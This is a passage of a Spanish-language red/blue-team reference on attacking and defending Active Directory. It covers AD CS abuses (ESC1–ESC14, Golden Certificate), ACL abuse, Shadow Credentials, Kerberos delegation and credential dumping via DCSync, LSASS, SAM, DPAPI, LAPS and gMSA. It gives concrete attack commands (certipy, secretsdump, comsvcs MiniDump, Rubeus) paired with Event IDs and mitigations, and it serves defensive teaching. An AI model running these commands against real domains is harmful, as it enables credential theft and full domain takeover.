Devuelve plantillas marcadas `ESCx`, permisos de enrolamiento, flags de la CA y ACLs. Alternativa: `Certify.exe find /vulnerable`. Salida en BloodHound: `certipy find -bloodhound`.

| ESC | Qué es (1 línea) | Herramienta + comando ilustrativo |
|-----|------------------|-----------------------------------|
| ESC1 | Template permite `ENROLLEE_SUPPLIES_SUBJECT` + Client Auth → pedís cert con SAN/UPN arbitrario | `certipy req -u u@dom -p pw -ca CA -template Vuln -upn administrator@dom` |
| ESC2 | Template con EKU `Any Purpose` (o sin EKU) → sirve para autenticar | `certipy req ... -template AnyPurpose` (luego se abusa como ESC3/subordinada) |
| ESC3 | Template de *Enrollment Agent* (EKU Certificate Request Agent, OID 1.3.6.1.4.1.311.20.2.1) → pedís cert "en nombre de" otro | `certipy req ... -template EnrollAgent` → `certipy req ... -on-behalf-of 'dom\admin' -pfx agent.pfx` |
| ESC4 | Tenés permiso de *escritura* (WriteDacl/WriteOwner/Write) sobre la plantilla → la volvés vulnerable, explotás, restaurás | `certipy template -template Vuln -save-old` (reconfigura a vulnerable y guarda la original) → luego ESC1 → restaurar con `-configuration Vuln.json` |
| ESC6 | CA con flag `EDITF_ATTRIBUTESUBJECTALTNAME2` → SAN arbitrario en *cualquier* template, aunque no lo permita | `certipy req ... -template User -upn administrator@dom` (SAN aceptado por la CA) |
| ESC7 | Tenés derecho `ManageCA`/`Manage Certificates` (CA officer) → habilitás flags, aprobás pedidos, o autoenrolás SubCA | `certipy ca -ca CA -enable-template SubCA` / `-issue-request <id>` |
| ESC8 | Web Enrollment HTTP (`certsrv`) sin EPA → coerción + NTLM relay hacia el endpoint, obtenés cert de la víctima | `certipy relay -target 'http://CA'` (endpoint certsrv/certfnsh.asp) + coerción (PetitPotam/Coercer) |
| ESC9 | Template con flag `CT_FLAG_NO_SECURITY_EXTENSION` → cert sin SID binding (szOID_NTDS_CA_SECURITY_EXT), mapeable a otra cuenta | Requiere control de `userPrincipalName` de una cuenta + `StrongCertificateBindingEnforcement` bajo |
| ESC10 | Mapeo débil de certs en el DC (`CertificateMappingMethods`/`StrongCertificateBindingEnforcement=0/1`) → UPN spoofing | Cambiar UPN de víctima → enrolar → autenticar como el target |
| ESC11 | Endpoint RPC ICPR (`ICertPassage`) sin `IF_ENFORCEENCRYPTICERTREQUEST` → relay NTLM por RPC (equivalente a ESC8 sin HTTP) | `certipy relay -target 'rpc://CA' -ca CA` |
| ESC13 | Template con *Issuance Policy* vinculada (OID) a un grupo AD → el cert otorga membresía efectiva de ese grupo | `certipy find` marca ESC13; `certipy req ... -template PolicyLinked` |
| ESC14 | Mapeo explícito débil vía `altSecurityIdentities` → escribís un mapeo (p.ej. por Issuer+Subject) que apunta tu cert a una cuenta privilegiada | Escribir `altSecurityIdentities` sobre la víctima (requiere write sobre el atributo) |

> Nota: **ESC5** (control de objetos PKI en AD: CA server object, contenedor NTAuthCertificates, etc.) y **ESC12** (shell en la CA con clave almacenada en YubiHSM/almacén exportable) existen y aparecen en la matriz de SpecterOps; no fueron pedidos pero convienen mencionarlos en clase para completar la numeración.

**Post-explotación con el .pfx obtenido:**
- **PKINIT → TGT:** `certipy auth -pfx admin.pfx -dc-ip 10.0.0.1` → obtenés TGT (Kerberos por certificado).
- **UnPAC-the-hash:** el mismo `certipy auth` recupera **automáticamente** el **NTLM hash** de la cuenta desde el PAC del TGT (vía U2U); no requiere flag extra. Equivalente en Rubeus: `asktgt /getcredentials`. Convierte "tengo un cert" en "tengo el hash" → pass-the-hash / persistencia offline.

**Robo de certificados (THEFT — T1649):**
| Vector | Qué es | Comando ilustrativo |
|--------|--------|---------------------|
| THEFT1 | Exportar cert+clave del store del usuario (DPAPI) | `certipy` / Mimikatz `crypto::certificates /export` |
| THEFT2 | Extraer clave de máquina (DPAPI machine) | Mimikatz `crypto::certificates /systemstore:LOCAL_MACHINE /export` |
| THEFT3/4 | Robo vía DPAPI masterkeys / archivos `.pfx` en disco | SharpDPAPI `certificates` |
| THEFT5 | PKINIT para obtener credencial sin tocar el store | `certipy auth` (ver arriba) |

**Golden Certificate (persistencia de dominio total):** robar la **clave privada de la CA** (backup del cert de la CA raíz) → forjar certs de cliente arbitrarios *offline*, sin tocar la CA ni generar pedidos.
`certipy ca -backup` (con ManageCA) o exportar `ca.pfx` desde el servidor → `certipy forge -ca-pfx ca.pfx -upn administrator@dom -subject 'CN=Administrator'`. El cert forjado autentica como cualquiera y sobrevive a reseteos de contraseña (solo se revoca reemitiendo/rotando la CA).

---

### Detección (blue team)

| Señal | Event ID / fuente | Qué lo delata |
|-------|-------------------|---------------|
| Pedido de certificado | **4886** (Security, CA) | Certificate Services recibió una solicitud — línea base de toda emisión |
| Certificado emitido | **4887** (Security, CA) | Cert aprobado/emitido; correlacionar *Requester* vs *SAN/UPN* del cert |
| **SAN ≠ Requester** (ESC1/ESC6) | Correlación 4886/4887 | El solicitante `user01` obtiene cert con UPN `administrator@dom` → alerta alta |
| Autenticación PKINIT | **4768** (TGT Request) con campo *Certificate Information* (Issuer/Serial/Thumbprint) poblado | Login Kerberos por certificado; cruzar con emisiones legítimas |
| Cambio de config/flags de CA (ESC6) | **4892** (propiedad de Certificate Services cambiada) + monitoreo de `EDITF_ATTRIBUTESUBJECTALTNAME2` vía `certutil -getreg policy\EditFlags` | Habilitación de SAN arbitrario en la CA |
| Cambio de roles/permisos de CA (ESC7) | **4890** (cert manager settings) / **4882** (permisos de seguridad de CA cambiados) | Alta de CA officer / ManageCA / Manage Certificates |
| Enrolamiento anómalo / template abuse (ESC4) | **4899** (template updated), **4900** (template security updated) | Modificación de plantilla justo antes de un pedido |
| Relay a web/RPC enrollment (ESC8/ESC11) | Correlación de logon NTLM en la CA (**4624** type 3) con 4886 inmediato desde cuenta de máquina (`$`) | Cuenta de equipo pidiendo cert de usuario tras coerción |
| Robo de cert / DPAPI | **Sysmon 10** (ProcessAccess a `lsass.exe`), **Sysmon 1** (Mimikatz/Rubeus), **4662** (acceso al objeto de backup key DPAPI en AD) | Extracción de clave privada del store |
| Backup/robo de clave de CA (Golden) | **Sysmon 11** (creación de `.pfx`/`.p12`), **4876/4877/4878/4879** (CA backup/restore) | Exportación de la clave de la CA raíz |

> Regla de oro de detección: la **correlación 4886/4887 comparando el "Requester" contra el "Subject Alternative Name" del cert emitido** es el detector más potente y de bajo falso-positivo para ESC1/ESC6. Habilitar auditoría de la CA: `certutil -setreg CA\AuditFilter 127` + política "Audit Certification Services".

---

### Mitigación (blue team)

| Área | Acción |
|------|--------|
| Mapeo fuerte (ESC9/10/14) | **StrongCertificateBindingEnforcement = 2** (Full Enforcement) en todos los DC — KB5014754. Fuerza la SID security extension; deprecar mapeos débiles en `altSecurityIdentities` (usar solo Issuer+Serial o SKI, nunca Subject/Issuer solos ni Email/UPN). |
| ESC6 | Quitar `EDITF_ATTRIBUTESUBJECTALTNAME2` de la CA: `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` + reiniciar `certsvc`. |
| ESC1/ESC2/ESC3/ESC13 | Restringir enrolamiento: quitar `ENROLLEE_SUPPLIES_SUBJECT`, no dar Client Auth + Enroll a grupos amplios (Domain Users/Authenticated Users), requerir aprobación de manager (`CT_FLAG_PEND_ALL_REQUESTS`), auditar EKUs "Any Purpose"/"Enrollment Agent" e Issuance Policies vinculadas a grupos. |
| ESC4 | Revisar ACLs de plantillas: solo administradores de PKI con Write/WriteDacl/WriteOwner. |
| ESC7 | Restringir `ManageCA`/`Manage Certificates` a personal de PKI; auditar cambios de roles de CA (4882/4890). |
| ESC8/ESC11 | Deshabilitar Web Enrollment (`certsrv`) si no se usa; si se usa, **forzar HTTPS + EPA (Extended Protection for Authentication)** y **Require SSL**; para ESC11 habilitar `IF_ENFORCEENCRYPTICERTREQUEST` (firma/cifrado RPC). Mitigar coerción: parche PetitPotam, deshabilitar NTLM donde se pueda, SMB/LDAP signing. |
| Golden Certificate | Proteger la clave privada de la CA (HSM), restringir backup/restore, monitorear 4876-4879; ante compromiso: rotar la CA. |
| Higiene general | Correr `certipy find -vulnerable` / **PSPKIAudit** / **Locksmith** periódicamente como control preventivo; tratar los servidores CA como Tier 0. |

---

#### Abuso de DACL/ACL + Shadow Credentials

> **Encuadre:** Estas aristas aparecen en BloodHound como caminos de escalada dentro del dominio. El patrón mental es siempre el mismo: **un derecho de escritura sobre un objeto = control sobre el principal que representa.** Solo contra objetivos autorizados (lab propio / HTB / engagement con permiso escrito). Los comandos son ilustrativos mínimos, no tooling listo para volcar.

**Convenciones:** `dom`=dominio, `u/p`=credenciales del atacante, `DC`=IP/FQDN del controlador. `bloodyAD` habla LDAP/LDAPS; `impacket` (dacledit/owneredit/secretsdump) habla MS-RPC/LDAP; PowerView corre en la sesión de la víctima.

---

##### 1. Aristas de escritura sobre objetos (ACL abuse)

| Arista (BH) | Qué es (1 línea) | Cómo abusar (herramienta + comando mínimo) |
|---|---|---|
| **GenericAll** | Control total sobre el objeto (superset de todo). | Sobre user → resetear pass o Shadow Creds: `bloodyAD -d dom -u u -p p --host DC set password TARGET 'N3w!Pass'`. Sobre grupo → auto-agregarse. Sobre computer → RBCD o Shadow Creds. |
| **GenericWrite** | Escribir la mayoría de atributos no protegidos. | Setear SPN (kerberoast dirigido) o `msDS-KeyCredentialLink` (Shadow Creds). `bloodyAD ... set object TARGET servicePrincipalName -v HOST/x`. |
| **WriteDACL** | Reescribir la DACL del objeto → auto-otorgarse GenericAll. | `dacledit.py -action write -rights FullControl -principal ATACANTE -target VICTIMA dom/u:p` (impacket); luego se abusa como GenericAll. |
| **WriteOwner** | Cambiar el *owner*; el owner puede reescribir la DACL. | `owneredit.py -action write -owner ATACANTE -target VICTIMA dom/u:p`; después WriteDACL → GenericAll. |
| **AddMember** | Agregar miembros a un grupo (p.ej. Domain Admins). | `bloodyAD ... add groupMember "GRUPO" ATACANTE` o `net rpc group addmem "GRUPO" ATACANTE -U dom/u%p -S DC`. |
| **ForceChangePassword** | Resetear la pass del user **sin conocer la actual**. | `net rpc password VICTIMA 'N3w!Pass' -U dom/u%p -S DC` o `bloodyAD ... set password VICTIMA 'N3w!Pass'`. |
| **AddSelf** | Caso de AddMember donde solo podés agregarte *vos mismo*. | `bloodyAD ... add groupMember "GRUPO" ATACANTE`. |
| **AllExtendedRights** | Todos los *control access rights* (incluye ForceChangePassword y, sobre el objeto dominio, **DCSync**). | Sobre user → reset pass. Sobre dominio → `secretsdump.py -just-dc dom/u:p@DC` (DCSync). |
| **WriteSPN** | Escribir `servicePrincipalName` → **Kerberoasting dirigido**. | `targetedKerberoast.py -d dom -u u -p p` (setea SPN, pide TGS, revierte) → crackear offline. |

**PowerView (desde sesión Windows):** para otorgar aristas — p.ej. WriteDACL:
`Add-DomainObjectAcl -TargetIdentity VICTIMA -PrincipalIdentity ATACANTE -Rights All`; y para escribir atributos `Set-DomainObject -Identity VICTIMA -Set @{serviceprincipalname='HOST/x'}`.

**Cadena típica de encadenado:** WriteOwner → (te hacés owner) → WriteDACL → (te das GenericAll) → GenericWrite → Shadow Creds / reset / SPN.

---

##### 2. Shadow Credentials (msDS-KeyCredentialLink)

- **Qué es:** con **GenericWrite/GenericAll/WriteProperty** sobre `msDS-KeyCredentialLink` de un user o computer, agregás una clave pública propia (Key Trust). Luego autenticás por **PKINIT** con tu clave privada y obtenés un TGT → del cual derivás el **NT hash** de la víctima, **sin cambiar su contraseña** (sigiloso, no rompe la cuenta).
- **Requisito de entorno:** el DC necesita PKINIT operativo (típicamente un CA/cert de DC — AD CS o KDC cert). Funciona contra Server 2016+.
- **Cómo (flujo mínimo):**
  1. Inyectar la clave: `pywhisker.py -d dom -u u -p p --target VICTIMA --action add` (genera un `.pfx`). Alternativa todo-en-uno: `certipy shadow auto -u u@dom -p p -account VICTIMA` (hace add → PKINIT → devuelve NT hash y limpia).
  2. TGT vía PKINIT: `gettgtpkinit.py -cert-pfx cred.pfx dom/VICTIMA out.ccache` (PKINITtools) — imprime la *AS-REP encryption key*.
  3. NT hash: `getnthash.py -key <AS-REP-encpart-key> dom/VICTIMA` (usa la clave impresa por el paso 2).
- **Higiene ofensiva:** borrar el `KeyCredential` inyectado al terminar (`--action remove` en pywhisker) para no dejar la clave persistente.

---

##### 3. Detección (Blue Team)

> **Requisito previo:** el Event ID **5136** solo se genera si hay **auditoría de Directory Service Changes** habilitada + una **SACL** en los objetos/OUs sensibles. Sin SACL, la modificación es silenciosa a nivel Security log. Complementar con auditoría de Directory Service Access (4662).

| Técnica | Event ID (Windows Security) | Qué lo delata |
|---|---|---|
| Shadow Credentials | **5136** | Modificación del atributo `msDS-KeyCredentialLink` (aparece como valor binario blob en el evento). Alertar SIEMPRE fuera de flujos WHfB/Intune legítimos. |
| WriteDACL / WriteOwner | **5136** (mod. de `nTSecurityDescriptor`, fuente autoritativa) y **4670** (permisos sobre objeto cambiados; menos fiable en objetos AD) | Cambio de DACL/owner en user, grupo, computer o el objeto dominio. |
| ForceChangePassword / reset | **4724** (reset de pass por otra cuenta) + **4738** (user account changed) | El campo *Subject* ≠ *Target* delata reset ajeno. |
| AddMember / AddSelf | **4728** (grupo global), **4732** (local), **4756** (universal) | Miembro agregado a grupo con seg. habilitada; vigilar grupos privilegiados. |
| AllExtendedRights → **DCSync** | **4662** | Operación con el GUID del extended right de replicación (`DS-Replication-Get-Changes` / `-All`); origen no-DC = alerta roja. |
| WriteSPN (kerberoast dirigido) | **4738**/**4742** (cambio user/computer) + **4769** (TGS solicitado, RC4/`0x17`) | Aparición súbita de un SPN + petición de TGS con cifrado débil. |

**Sysmon:** correlacionar con **Event ID 1** (proceso: `net.exe`, `rpcclient`, binarios impacket, PowerShell con cmdlets de PowerView) y **3** (conexión LDAP/RPC saliente al DC desde host de estación). Sysmon no ve la mod. de atributos LDAP: la fuente autoritativa es el Security log del DC.

---

##### 4. MITRE ATT&CK

| Técnica ofensiva | ID ATT&CK |
|---|---|
| Shadow Credentials, ForceChangePassword, AddMember/AddSelf, reset de pass | **T1098** – Account Manipulation |
| WriteDACL / WriteOwner (modificación de permisos del objeto) | **T1222.001** – File and Directory Permissions Modification: Windows *(mapeo convencional de detection engineering)* |
| WriteSPN → Kerberoasting dirigido | **T1558.003** – Steal or Forge Kerberos Tickets: Kerberoasting |
| AllExtendedRights sobre dominio → DCSync | **T1003.006** – OS Credential Dumping: DCSync |

---

##### 5. Mitigación

- **Monitorear escrituras a atributos sensibles:** SACL + auditoría sobre `msDS-KeyCredentialLink`, `nTSecurityDescriptor`, `servicePrincipalName`, `msDS-AllowedToActOnBehalfOfOtherIdentity` en objetos de tiering alto; alertar en 5136/4670/4662.
- **Tiering (modelo de niveles):** cuentas y estaciones de Tier 0 (DCs, AD CS, admins) aisladas; ningún principal de Tier 1/2 debe tener derechos de escritura sobre objetos Tier 0. Revisar caminos con BloodHound del lado defensivo.
- **Higiene de DACLs:** revisar y quitar ACEs excesivas (GenericAll/WriteDACL/WriteOwner) heredadas o mal delegadas; usar delegaciones granulares en vez de control total.
- **Shadow Creds específico:** si no usás Windows Hello for Business / Key Trust, cualquier valor en `msDS-KeyCredentialLink` es sospechoso. Endurecer AD CS (evita el PKINIT que habilita el paso final) y proteger el cert del KDC.
- **Grupos privilegiados:** Protected Users, restricción de membresías, y alerta inmediata en 4728/4732/4756 sobre grupos Tier 0.
- **Kerberos:** desactivar RC4 donde se pueda (fuerza AES) para que un SPN inyectado sea más ruidoso y menos crackeable; alertar 4769 con `0x17`.

---

#### Delegación Kerberos (Unconstrained / Constrained / RBCD)

> **Alcance:** solo objetivos autorizados (lab propio, HTB, engagement con permiso escrito). La delegación es una feature legítima de AD; su abuso escala a Domain Admin y por eso es material central de pizarra tanto para el red team como para el blue team.
>
> **Concepto base:** la delegación permite que un servicio actúe "en nombre de" un usuario contra otro servicio. Tres sabores, de más a menos peligroso: **Unconstrained** (el host guarda el TGT del usuario), **Constrained** (limitado a SPNs concretos), **RBCD** (el recurso destino decide quién puede suplantar). Mapeo ATT&CK del dominio (según la acción): **T1558** (forja/robo de tickets), **T1098** (manipulación del atributo de delegación), **T1550.003** (uso del ticket, Pass the Ticket) y **T1187** (coerción de autenticación).

---

**1. Unconstrained Delegation**

| Campo | Detalle |
|---|---|
| **Qué es** | Un host con el flag `TRUSTED_FOR_DELEGATION` (UAC `0x80000` = 524288) cachea en memoria el **TGT** de cualquier usuario que se le autentique → si comprometés ese host, robás TGTs (incluido el de un DC si lo coaccionás). |
| **Cómo** | Coaccionar autenticación del DC hacia el host controlado y capturar su TGT. `PetitPotam.py` (MS-EFSRPC) o `printerbug.py`/SpoolSample (MS-RPRN) para forzar a `DC$`; en el host, `Rubeus.exe monitor /interval:5 /nowrap` o `krbrelayx.py` a la escucha. TGT capturado → `Rubeus ptt` / `mimikatz kerberos::ptt` → DCSync. |
| **Detección** | **4768** (TGT solicitado) y **4769** anómalos desde/hacia el host delegado; **5145/5140** o tráfico RPC de `MS-RPRN`/`MS-EFSRPC` hacia el atacante; enumeración previa de hosts con `TRUSTED_FOR_DELEGATION` (LDAP). Sysmon **ID 1** de `Rubeus`/`mimikatz`. Alta señal: un `DC$` autenticándose contra un servidor miembro sin motivo. |
| **ATT&CK** | Coerción **T1187** (Forced Authentication); robo/forja de TGT **T1558**; uso del TGT robado **T1550.003** (Pass the Ticket). |
| **Mitigación** | Poner cuentas privilegiadas en **Protected Users**; flag *"La cuenta es sensible y no se puede delegar"* (`NOT_DELEGATED`, UAC `0x100000` = 1048576) en admins; eliminar unconstrained donde no sea imprescindible; parchear/segmentar MS-RPRN y MS-EFSRPC; DCs nunca deben confiar en hosts unconstrained. |

---

**2. Constrained Delegation (KCD)**

| Campo | Detalle |
|---|---|
| **Qué es** | La cuenta tiene `msDS-AllowedToDelegateTo` con una lista de SPNs; puede pedir tickets de servicio a nombre de otros usuarios **solo** hacia esos SPNs, vía **S4U2self + S4U2proxy**. |
| **Cómo** | Con la clave/hash de la cuenta delegada: `Rubeus.exe s4u /user:svc$ /rc4:<hash> /impersonate:Administrator /msdsspn:cifs/target /ptt` (o impacket `getST.py -spn cifs/target -impersonate Administrator dom/svc$`). Con `TrustedToAuthForDelegation` (**protocol transition**, UAC `0x1000000` = 16777216), S4U2self da ticket forwardable sin credencial del usuario → suplantación total. **Sin** ese flag, la delegación solo funciona con un ticket forwardable ya existente (S4U2proxy sin transición). |
| **Alternate service name + Bronze Bit** | *Dos técnicas distintas.* (a) **Alternate service name**: el servicio destino no valida la clase del `sname` en el ticket devuelto por S4U2proxy → se sustituye la clase (`cifs`→`host`/`ldap`/`http`) para pivotar a otros servicios del **mismo** host (`Rubeus /altservice:ldap`). (b) **Bronze Bit** (**CVE-2020-17049**, parche nov-2020): el flag *forwardable* del ticket S4U2self no está protegido criptográficamente → con la clave del servicio se fuerza a emitir un ticket forwardable aunque el usuario sea *sensitive/NotDelegated* o no haya protocol transition (`Rubeus /bronzebit`). |
| **Detección** | **4769** con el campo **Transited Services** poblado (firma clásica de S4U2proxy) y `Account Name` = cuenta de servicio pidiendo TS a nombre de un usuario que nunca tocó ese host; **5136** sobre `msDS-AllowedToDelegateTo` / `userAccountControl` (activación de `TrustedToAuthForDelegation`); **4738** (cuenta de usuario/servicio cambiada) / **4742** (cuenta de equipo cambiada) en cambios de UAC. Bronze Bit: aplicar parche nov-2020; alertar sobre incoherencias en PAC/tickets tras la fecha de parche. |
| **ATT&CK** | Habilitar/modificar `AllowedToDelegateTo` o `TrustedToAuthForDelegation` → **T1098** (Account Manipulation); emisión/forja del ticket S4U → **T1558**; uso del ticket → **T1550.003**. |
| **Mitigación** | Aplicar CVE-2020-17049; evitar protocol transition (usar *KCD without protocol transition* cuando se pueda); **Protected Users** + flag *sensitive/NotDelegated* en admins (mitiga el S4U estándar, no el Bronze Bit sin parche); minimizar SPNs en `AllowedToDelegateTo`; **gMSA** para cuentas de servicio. |

---

**3. Resource-Based Constrained Delegation (RBCD)**

| Campo | Detalle |
|---|---|
| **Qué es** | El atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` vive en el objeto **destino** y define qué principals pueden suplantar usuarios contra él. Camino de escalada favorito porque suele bastar con `GenericWrite`/`WriteDACL` sobre un equipo. |
| **Cómo** | (1) Con **MachineAccountQuota** > 0 (default 10) crear una cuenta de máquina: `addcomputer.py dom/user -computer-name EVIL$ -computer-pass <pw>`. (2) Escribir el atributo en la víctima con el `GenericWrite`: `rbcd.py -delegate-from EVIL$ -delegate-to VICTIM$ -action write dom/user`. (3) S4U para obtener ticket como admin: `getST.py -spn cifs/victim -impersonate Administrator -dc-ip <dc> dom/EVIL$` → `secretsdump.py`. Equivalente Windows: `Rubeus s4u /user:EVIL$ /rc4:<hash> /impersonate:Administrator /msdsspn:cifs/victim /ptt`. |
| **Detección** | **5136** sobre `msDS-AllowedToActOnBehalfOfOtherIdentity` (creación/cambio del atributo = alerta de alta fidelidad; requiere auditoría *DS Access* con la SACL correspondiente); **4741** (cuenta de equipo creada → abuso de MAQ, `EVIL$` con creador anómalo); **4742** (cambio en el objeto equipo); **4769** con Transited Services de la nueva cuenta suplantando a un admin. |
| **ATT&CK** | Escritura del atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` → **T1098** (Account Manipulation); ticket S4U → **T1558**; uso → **T1550.003**. |
| **Mitigación** | **MachineAccountQuota = 0** (delegar la creación de equipos solo a operadores designados); auditar y bloquear escrituras (`GenericWrite`/`WriteDACL`/`GenericAll`) sobre objetos computer con BloodHound; **Protected Users** + flag *sensitive/NotDelegated* en cuentas privilegiadas; limpiar ACLs heredadas peligrosas; gMSA. |

---

**Resumen defensivo (blue team)**

| Vector | Event IDs clave | Auditoría a habilitar |
|---|---|---|
| Unconstrained | 4768, 4769, 4624 | Kerberos Auth/TGT; alertar `DC$` autenticándose a miembros |
| Constrained / S4U | 4769 (Transited Services), 5136, 4738/4742 | *Audit Kerberos Service Ticket Operations*; *DS Access* con SACL |
| RBCD | 5136, 4741, 4742, 4769 | *DS Access* con SACL sobre computers; creación de cuentas |

**Controles transversales:** grupo **Protected Users**, flag `NOT_DELEGATED` en Tier-0, `MachineAccountQuota=0`, **gMSA** para servicios, modelo de tiering, y BloodHound periódico para cazar caminos de delegación antes que el atacante.

**Mapeo ATT&CK del dominio (por acción):** **T1187** (Forced Authentication) para la coerción; **T1098** (Account Manipulation) para la manipulación de atributos de delegación; **T1558** (Steal or Forge Kerberos Tickets) para la forja/robo de tickets; **T1550.003** (Use Alternate Authentication Material: Pass the Ticket) para el uso del ticket obtenido.

---

#### Acceso a credenciales (DCSync, LSASS, DPAPI, LAPS, gMSA, SAM)

> Solo en objetivos autorizados: lab propio, HTB o engagement con permiso escrito. Todo lo que sigue es material de pizarra: cada técnica ofensiva lleva su gemelo defensivo (Event ID + ATT&CK + mitigación).

---

**1. DCSync**
- **Qué es:** abusa del derecho de replicación (`DS-Replication-Get-Changes` + `-Get-Changes-All`) para pedirle a un DC, vía protocolo DRSUAPI (`IDL_DRSGetNCChanges`), los hashes de cualquier cuenta sin tocar disco ni LSASS del DC.
- **Cómo:** `secretsdump.py -just-dc-user krbtgt 'DOM/user:pass@dc'` (impacket) o `lsadump::dcsync /user:krbtgt` (mimikatz). Un usuario con esos ACE (o Domain/Enterprise Admin, o Exchange mal delegado) alcanza.
- **Detección:** **4662** (Operation performed on an object) donde `Properties` contiene un GUID de replicación —típicamente `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (**Get-Changes-All**, el que da acceso a los secretos) y/o `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (**Get-Changes**)— **desde una IP/cuenta que NO es un DC** = DCSync. Correlacionar contra la lista de DCs legítimos.
- **ATT&CK:** T1003.006 (OS Credential Dumping: DCSync).
- **Mitigación:** auditar y minimizar quién tiene los ACE de replicación (RBAC de replicación), monitorear cambios en esos ACE, Protected Users para cuentas privilegiadas, alertar todo 4662 de replicación fuera de DCs.

| GUID de replicación | Derecho |
|---|---|
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All |

---

**2. Volcado de LSASS**
- **Qué es:** extraer credenciales en memoria (NTLM, tickets Kerberos, a veces plaintext WDigest) del proceso `lsass.exe`.
- **Cómo:** `sekurlsa::logonpasswords` (mimikatz, en vivo) o dump + parse offline: `comsvcs.dll MiniDump` (`rundll32 comsvcs.dll, MiniDump <PID> lsass.dmp full`), `nanodump`, y parseo con `pypykatz lsa minidump lsass.dmp`.
- **Detección:** **Sysmon Event ID 10** (ProcessAccess) con `TargetImage` = `lsass.exe` y `GrantedAccess` sospechoso (p.ej. `0x1010`/`0x1410`/`0x1fffff`); complementar con 4656/4663 sobre el objeto lsass si hay SACL. rundll32 invocando comsvcs.dll MiniDump es un patrón de línea de comandos alertable (Sysmon 1 / 4688).
- **ATT&CK:** T1003.001 (LSASS Memory).
- **Mitigación:** LSASS como PPL (`RunAsPPL`), Credential Guard (aísla secretos en VBS/VSM), deshabilitar WDigest, Attack Surface Reduction rule de bloqueo de robo de credenciales de LSASS, EDR con tamper protection.

---

**3. Hives SAM / SECURITY / SYSTEM**
- **Qué es:** hashes NTLM de cuentas locales (SAM) + secretos LSA/cached (SECURITY), descifrables con la boot key de SYSTEM.
- **Cómo:** `reg save HKLM\SAM sam.hive` (+ SECURITY, SYSTEM) y offline `secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL`. Remoto: `secretsdump.py DOM/user@host` usa el registro/servicio para lo mismo.
- **Detección:** **4688 / Sysmon 1** con `reg.exe save` sobre HKLM\SAM|SECURITY|SYSTEM; acceso remoto vía **7045** (instalación de servicio, secretsdump habilita RemoteRegistry / crea servicio) o **5145** (detailed share access a ADMIN$/IPC$), firma típica de secretsdump remoto.
- **ATT&CK:** T1003.002 (Security Account Manager), T1003.004 (LSA Secrets).
- **Mitigación:** restringir admin local (LAPS), Protected Users, monitoreo de acceso al registro, evitar reutilización de contraseña de admin local entre equipos.

---

**4. DPAPI (masterkeys, credenciales, vaults, navegadores)**
- **Qué es:** Windows cifra secretos (Credential Manager, vaults, cookies/contraseñas de navegador, RDP, Wi-Fi) con DPAPI; robando la masterkey del usuario (o el DPAPI backup key del dominio) se descifra todo.
- **Cómo:** `SharpDPAPI credentials /rpc` o `masterkeys`, `mimikatz dpapi::masterkey` / `dpapi::cred`, `dpapi.py` (impacket). La **DPAPI domain backup key** (via `lsadump::backupkeys` contra un DC, sobre MS-BKRP/LSARPC) descifra masterkeys de CUALQUIER usuario del dominio.
- **Detección:** acceso a `%APPDATA%\Microsoft\Protect\<SID>\` y a los stores de credenciales (`\Microsoft\Credentials`, `\Microsoft\Vault`); **4692/4693** (backup/recovery de DPAPI masterkey). El robo de la domain backup key se detecta sobre todo a nivel DC: monitoreo de acceso privilegiado y de solicitudes MS-BKRP/LSARPC contra el DC (no genera un 4662 canónico sobre un objeto de directorio).
- **ATT&CK:** T1555 (Credentials from Password Stores), T1555.003 (browser), T1555.004 (Windows Credential Manager).
- **Mitigación:** Credential Guard, Protected Users (no cachea masterkeys del mismo modo), proteger el DC (la backup key es la joya), rotar secretos tras compromiso.

---

**5. LAPS (legacy y Windows LAPS)**
- **Qué es:** LAPS guarda la contraseña de admin local en un atributo del objeto de máquina en AD; leíble por quien tenga los permisos de lectura del atributo (ACL mal puesta = escalada).
- **Cómo (legacy):** atributo `ms-Mcs-AdmPwd` (texto plano); `nxc ldap <dc> -u u -p p --laps`, `LAPSDumper`, o `bloodyAD --host dc get object <PC$> --attr ms-Mcs-AdmPwd`.
- **Cómo (Windows LAPS):** atributo `msLAPS-Password` (texto/JSON) / `msLAPS-EncryptedPassword` (cifrado, requiere permiso de descifrado).
- **Detección:** **4662** de lectura sobre el atributo LAPS del objeto computadora (activar auditoría/SACL sobre esos atributos); lecturas masivas o desde cuentas no operativas.
- **ATT&CK:** T1555 (Credentials from Password Stores) — encaje aproximado; MITRE no tiene sub-técnica dedicada a la lectura de LAPS desde el directorio.
- **Mitigación:** ACL restrictiva sobre `ms-Mcs-AdmPwd`/`msLAPS-Password` (solo tier admins), migrar a Windows LAPS con cifrado, auditar `ExtendedRights` y `ReadProperty` sobre esos atributos, rotación al leer.

---

**6. gMSA (Group Managed Service Accounts)**
- **Qué es:** la contraseña gMSA vive en el atributo `msDS-ManagedPassword` (blob), derivable solo por los principales listados en `PrincipalsAllowedToRetrieveManagedPassword` (respaldado por el atributo AD `msDS-GroupMSAMembership`); una cuenta autorizada la calcula y saca su NTLM.
- **Cómo:** `gMSADumper.py -u u -p p -d dom`, `nxc ldap <dc> -u u -p p --gmsa`, o `bloodyAD --host dc get object <gmsa$> --attr msDS-ManagedPassword`.
- **Detección:** **4662** de lectura sobre `msDS-ManagedPassword` desde una cuenta que no debería resolverlo; revisar quién está en `PrincipalsAllowedToRetrieveManagedPassword` / `msDS-GroupMSAMembership`.
- **ATT&CK:** T1555 (Credentials from Password Stores) — encaje aproximado; sin sub-técnica MITRE específica para lectura de gMSA del directorio.
- **Mitigación:** minimizar y auditar `PrincipalsAllowedToRetrieveManagedPassword`, SACL sobre el atributo, tiering, revisar delegaciones que otorguen esos derechos indirectamente.

---

**7. MSCACHE v2 / credenciales cacheadas de dominio**
- **Qué es:** cachés de logon de dominio (DCC2/MSCACHEv2) guardadas en el hive SECURITY para logon offline; no sirven para pass-the-hash pero sí para crackeo.
- **Cómo:** `secretsdump.py ... LOCAL` las extrae como `$DCC2$`; crackeo con hashcat **modo 2100** (`hashcat -m 2100 hashes.txt wordlist`).
- **Detección:** misma cadena que hives SAM/SECURITY: **4688/Sysmon 1** (reg save de HKLM\SECURITY), **7045/5145** en volcado remoto.
